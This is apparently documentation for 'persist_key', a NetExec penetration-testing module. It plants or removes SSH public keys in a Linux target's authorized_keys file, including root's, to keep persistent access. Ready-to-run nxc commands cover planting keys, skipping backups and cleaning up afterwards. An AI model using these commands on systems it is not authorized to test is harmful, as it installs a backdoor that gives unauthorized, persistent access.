# `persist_key` Module

The `persist_key` module allows you to **inject or remove SSH public keys** into a target’s  
`~/.ssh/authorized_keys` file for persistence on Linux systems.

---

## 📖 Description

- **Module name:** `persist_key`  
- **Purpose:** Maintain persistent access by planting or removing SSH keys.  
- **Protocols:** `ssh`  
- **OpSec safe:** ⚠️ Yes (but persistence is detectable).  
- **Multiple hosts:** ❌ No — one SSH session at a time.  

---

## ⚙️ Options

| Option     | Default  | Description                                                                 |
|------------|----------|-----------------------------------------------------------------------------|
| `PUBKEY`   | *(auto)* | Path to a public key file, or the raw public key string. Defaults to scanning `~/.ssh/id_*.pub`. |
| `USER`     | *(auto)* | Target username. Defaults to the logged-in SSH user.                        |
| `BACKUP`   | `true`   | Whether to back up `authorized_keys` before modifying. (`true/false`)       |
| `REMOVE`   | `false`  | Remove mode: `true` (remove key), or `backup` (remove key + delete backup). |
| `KEX`      | *(none)* | Comma-separated list of KEX algorithms (legacy compatibility).              |
| `HOSTKEY`  | *(none)* | Comma-separated list of hostkey algorithms (legacy compatibility).          |

---

## ▶️ Usage

### Add your default SSH key
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key
nxc ssh <target> -u <user> -p <pass> -M persist_key -o PUBKEY=/path/to/key.pub```

To use copy and pasted public key
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@host"```

To drop key into another users folder
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o PUBKEY=/tmp/key.pub,USER=root```

To not backup keys on target system
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o BACKUP=false
```

Remove a previously added key
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o REMOVE=true,PUBKEY=/tmp/key.pub
```

Remove key and delete backup (bring back to original environment will not remove other authorized keys already on target system
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o REMOVE=backup,PUBKEY=/tmp/key.pub
```

Use Legacy
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o KEX="diffie-hellman-group1-sha1",HOSTKEY="ssh-rsa"
```

Autoremove added keys, and bring target system to original state
```bash
nxc ssh <target> -u <user> -p <pass> -M persist_key -o REMOVE=backup
```


